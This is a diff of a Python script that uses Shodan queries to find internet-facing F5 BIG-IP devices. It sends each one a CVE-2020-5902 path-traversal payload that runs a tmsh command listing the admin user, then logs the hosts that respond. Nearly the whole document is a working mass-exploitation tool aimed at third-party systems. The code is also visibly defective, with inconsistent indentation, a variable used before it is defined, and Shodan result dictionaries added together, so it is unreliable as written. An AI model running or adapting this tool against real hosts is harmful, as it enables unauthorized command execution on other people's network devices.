@@ -7,7 +7,7 @@
 # Author: cbk914
 
 import shodan
-import nmap
+#import nmap
 import json
 import requests
 import sys
@@ -16,23 +16,20 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
 API_KEY = "YOURAPIKEY"
-SEARCH_FOR = 'http.title:"BIG-IP&reg;- Redirect"'
-PAYLOAD = "/tmui/login.jsp/..;/tmui..." # CVE-2020-5902
-CVE = "CVE-2020-5902"
+SEARCH_BIGIP = 'http.title:"BIG-IP&reg;- Redirect"'
+SEARCH_FAVICON = 'http.favicon.hash:-335242539'
+
 session = requests.Session()
 
-def filter_result(str):
-    str.strip() #trim
-	str.lstrip() #ltrim
-	str.rstrip() #rtrim
-	return str
-
-def login (IP,PORT,CC):
+def checks (IP,PORT,CC):
+    print ("[*+]Checking for "+CVE+"\n")
 	try:
 		if PORT == "443":
 			http_type = "https"
 		else:
 			http_type = "http"
+        PAYLOAD = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin" # CVE-2020-5902
+        CVE = "CVE-2020-5902"
 		rawBody = "`{""}`"
 		headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","Referer":"https://"+IP+":"+PORT+""+PAYLOAD+"","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
 		response = session.post(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"", data=rawBody, headers=headers, verify=False)
@@ -42,7 +39,7 @@ def login (IP,PORT,CC):
             text_file.write(""+http_type+"://"+IP+":"+PORT+""+PAYLOAD+"\n")
 			text_file.close()
 		else:
-			print ("[*]Unreachable[*]")
+			print ("[*]F5 BIG IP Not detected[*]")
 	except Exception as e:
 		print('Error: %s' % e)
 
@@ -56,14 +53,14 @@ try:
 		api = shodan.Shodan(API_KEY)
 
         # Perform the search
-		result = api.search(SEARCH_FOR)
-
+		result = api.search(SEARCH_BIGIP) + api.search(SEARCH_FAVICON)
+        
         # Loop through the matches and print each IP
 		for service in result['matches']:
 				IP = str(service['ip_str'])
 				PORT = str(service['port'])
                 CC = service['location']['country_name']
-				login (IP,PORT,CC)
+				checks (IP,PORT,CC)
 except KeyboardInterrupt:
 		print ("Ctrl-c pressed ...")
 		sys.exit(1)
